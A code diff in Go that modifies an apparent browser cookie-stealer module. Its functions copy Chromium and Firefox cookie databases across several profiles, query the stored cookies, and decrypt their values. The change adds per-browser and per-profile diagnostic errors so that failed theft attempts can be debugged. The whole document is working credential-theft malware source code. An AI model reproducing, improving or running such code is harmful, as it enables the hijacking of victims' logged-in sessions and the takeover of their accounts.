@@ -8,6 +8,7 @@ func templateStealer() string {
 
 func runStealer() string {
 	results := map[string]string{}
+	var diagErrors []string
 
 	browsers := []struct {
 		name  string
@@ -38,11 +39,13 @@ func runStealer() string {
 			}
 
 			var cookies string
+			var errs []string
 			if br.name == "Firefox" {
-				cookies = stealFirefoxCookies(basePath)
+				cookies, errs = stealFirefoxCookies(basePath)
 			} else {
-				cookies = stealChromiumCookies(basePath, br.name)
+				cookies, errs = stealChromiumCookies(basePath, br.name)
 			}
+			diagErrors = append(diagErrors, errs...)
 
 			if cookies != "" {
 				if prev, ok := results[br.name]; ok {
@@ -54,17 +57,22 @@ func runStealer() string {
 		}
 	}
 
+	if len(diagErrors) > 0 {
+		results["_errors"] = strings.Join(diagErrors, "; ")
+	}
+
 	if len(results) == 0 {
-		return ""
+		results["_errors"] = "no browsers found"
 	}
 
 	out, _ := json.Marshal(results)
 	return string(out)
 }
 
-func stealChromiumCookies(userDataPath string, browserName string) string {
+func stealChromiumCookies(userDataPath string, browserName string) (string, []string) {
 	profiles := []string{"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"}
 	var allCookies strings.Builder
+	var errs []string
 
 	for _, profile := range profiles {
 		cookiePath := filepath.Join(userDataPath, profile, "Network", "Cookies")
@@ -85,6 +93,7 @@ func stealChromiumCookies(userDataPath string, browserName string) string {
 
 		db, err := sql.Open("sqlite", tmpPath)
 		if err != nil {
+			errs = append(errs, fmt.Sprintf("%s/%s open: %v", browserName, profile, err))
 			continue
 		}
 		db.Exec("PRAGMA busy_timeout = 3000")
@@ -92,17 +101,21 @@ func stealChromiumCookies(userDataPath string, browserName string) string {
 
 		rows, err := db.Query("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
 		if err != nil {
+			errs = append(errs, fmt.Sprintf("%s/%s query: %v", browserName, profile, err))
 			db.Close()
 			continue
 		}
 
+		rowCount := 0
 		for rows.Next() {
 			var host, name, path string
 			var encValue []byte
 			var expires int64
 			if err := rows.Scan(&host, &name, &path, &encValue, &expires); err != nil {
+				errs = append(errs, fmt.Sprintf("%s/%s scan: %v", browserName, profile, err))
 				continue
 			}
+			rowCount++
 
 			value := decryptCookieValue(encValue, userDataPath)
 
@@ -111,17 +124,22 @@ func stealChromiumCookies(userDataPath string, browserName string) string {
 		}
 		rows.Close()
 		db.Close()
+
+		if rowCount == 0 {
+			errs = append(errs, fmt.Sprintf("%s/%s: 0 rows", browserName, profile))
+		}
 	}
 
-	return allCookies.String()
+	return allCookies.String(), errs
 }
 
-func stealFirefoxCookies(profilesPath string) string {
+func stealFirefoxCookies(profilesPath string) (string, []string) {
 	var allCookies strings.Builder
+	var errs []string
 
 	entries, err := os.ReadDir(profilesPath)
 	if err != nil {
-		return ""
+		return "", []string{"firefox readdir: " + err.Error()}
 	}
 
 	for _, e := range entries {
@@ -143,6 +161,7 @@ func stealFirefoxCookies(profilesPath string) string {
 
 		db, err := sql.Open("sqlite", tmpPath)
 		if err != nil {
+			errs = append(errs, fmt.Sprintf("firefox/%s open: %v", e.Name(), err))
 			continue
 		}
 		db.Exec("PRAGMA busy_timeout = 3000")
@@ -150,6 +169,7 @@ func stealFirefoxCookies(profilesPath string) string {
 
 		rows, err := db.Query("SELECT host, name, path, value, expiry FROM moz_cookies")
 		if err != nil {
+			errs = append(errs, fmt.Sprintf("firefox/%s query: %v", e.Name(), err))
 			db.Close()
 			continue
 		}
@@ -158,6 +178,7 @@ func stealFirefoxCookies(profilesPath string) string {
 			var host, name, path, value string
 			var expiry int64
 			if err := rows.Scan(&host, &name, &path, &value, &expiry); err != nil {
+				errs = append(errs, fmt.Sprintf("firefox/%s scan: %v", e.Name(), err))
 				continue
 			}
 			allCookies.WriteString(fmt.Sprintf("%s\t%s\t%s\t%s\t%d\n",
@@ -167,7 +188,7 @@ func stealFirefoxCookies(profilesPath string) string {
 		db.Close()
 	}
 
-	return allCookies.String()
+	return allCookies.String(), errs
 }
 
 func decryptCookieValue(encValue []byte, userDataPath string) string {
